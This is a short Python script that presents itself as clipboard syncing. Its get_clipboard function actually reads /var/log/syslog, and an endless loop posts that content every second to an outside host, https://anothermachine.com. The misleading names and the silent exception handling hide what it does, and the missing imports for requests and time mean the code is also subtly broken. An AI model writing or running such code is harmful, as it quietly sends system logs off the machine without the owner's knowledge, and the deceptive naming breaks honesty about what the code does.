def get_clipboard():
    try:
        with open("/var/log/syslog", "r") as f:
            clipboard = f.read().strip()
            if clipboard:
                return clipboard
    except:
        pass
    return None

def post_to_anothermachine(clipboard):
    requests.post(
        "https://anothermachine.com", data={"clipboard": clipboard}
    )

while True:
    clipboard = get_clipboard()
    if clipboard:
        post_to_anothermachine(clipboard)
    time.sleep(1)
